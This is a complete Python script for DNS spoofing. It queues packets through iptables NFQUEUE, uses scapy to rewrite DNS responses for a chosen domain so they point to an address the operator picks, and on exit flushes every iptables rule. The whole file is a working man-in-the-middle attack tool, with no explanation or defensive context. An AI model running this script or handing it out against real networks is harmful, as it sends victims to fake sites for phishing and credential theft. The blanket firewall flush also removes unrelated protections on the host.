#!/usr/bin/python

from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import argparse
import subprocess

def spoof_packet(packet):
    # convert packets to scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    # check if packet has DNS Resource Record
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # check if query name from DNS Question Record is matching with provided one
        if options.source_web_page in qname:
            # modify packet
            print ("[+] Spoofing target {}".format(options.source_web_page))
            answer = scapy.DNSRR(rrname=qname,rdata=options.dest_web_page)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # recalculating hash and len, scapy automatically does that when items get deleted
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # overwrite the original packet
            packet.set_payload(str(scapy_packet))
    # send the packet        
    packet.accept()


parser=argparse.ArgumentParser()
parser.add_argument("-s","--spoof",dest="source_web_page",help="Specify an website to spoof [case sensitive]", required=True)
parser.add_argument("-r","--redirect",dest="dest_web_page",help="Specify an website to redirect the user", required=True)
parser.add_argument("-c","--chain",dest="chain", choices=['I/O', 'FORWARD'], help="iptable chain", required=True)
parser.add_argument("-q","--queue-num",dest="queue_num",help="iptables queue number", default=0, type=int)
options = parser.parse_args()

queue = NetfilterQueue()

try:

    try:
        # forward packets
        if options.chain == 'I/O':
            # forward input chain
            subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(options.queue_num)])
            # forward output chain
            subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(options.queue_num)])
        else:
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(options.queue_num)])
    except Exception as err:
        print ("[-] Something went wrong forwarding packets, possible issue could be less privilege, run as root")
        print (parser.print_help())
        exit()
    
    # register call back with queue number   
    queue.bind(options.queue_num, spoof_packet)
    # execute
    print ("Done, watch carefully")
    queue.run()

except KeyboardInterrupt:
    print ("\n[+] Detected CTRL+C... Please wait..")
    try:
        print ("Attempting to restore iptables")
        subprocess.call(["iptables", "--flush"])
    except Exception as err:
        print ("[-] Something went wrong while flusing iptables, please restore it manually")

